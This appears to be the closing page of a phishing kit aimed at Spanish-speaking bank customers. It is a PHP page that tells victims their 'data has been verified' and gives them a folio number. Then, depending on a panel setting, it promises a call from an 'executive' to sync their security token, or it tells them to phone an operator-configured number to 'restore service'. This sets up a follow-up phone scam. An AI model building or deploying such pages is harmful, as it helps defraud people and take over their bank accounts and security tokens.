<?php 
    
    include_once('../../../Config/MySQL.php');

    $sql = "SELECT tipo_mensaje, phone_contacto FROM config_panel";
    $db = new MySQL();
    $query = $db -> queryStandar($sql);
    while ($r = mysqli_fetch_array($query)) {
        $tipoMensaje = $r[0];
        $numero = $r[1];
    }
?>
<script src="TelasEnlace.js"></script>
<table height="20" width="730" border="0">
  <tbody><tr class="tittabdat">
    <td>&nbsp;&nbsp;&nbsp;&nbsp;Sus datos han sido verificados con exito ! </td>
  </tr>
  <tr class="tittabdat">
    <td class="textabcg"><p align="center"><img src="OK_verde.png" width="65" height="62"></p>
      <p align="center">
        <strong>El proceso de actualizaci&oacute;n ha sido concluido con exito !</strong>
    </p>
    <div style="width: 100%;display:block;text-align: center;padding-bottom: 20px;">
        <p>
            N&uacute;mero de Folio: <span class="Estilo1 folio_server" style="color: #ff0000"></span>
        </p>
        <p>
            <span class="Estilo2">Conserve su n&uacute;mero de folio</span>
        </p>

        <?php
            if($tipoMensaje == "1"){
        ?>
            
            <p>
                En un lapso no mayor a 2 horas se comunicara un ejecutivo con usted para sincronizar su dispositivo token.
            </p>
            
        <?php
            }else{
        ?>
            <p>
            Comunicate al n&uacute;mero <span style="font-weight: bold!important;"><?=$numero;?></span> con uno de nuestros ejecutivos para que restablesca tu servicio.
            </p>
            
            
        <?php
            }
        ?>
    </div>
          
          
              
              
      </td>
  </tr>
</tbody></table>

<table width="" border="0" cellspacing="0" cellpadding="5" style="width: 100%;text-align: center">
                    <tbody>
                    <tr>
                        <td>
                            <input id="ContinuarFolio" name="Aceptar" type="button" class="tittabcenazu" value="Aceptar">
                        </td>
                    </tr>
                    </tbody>
                </table>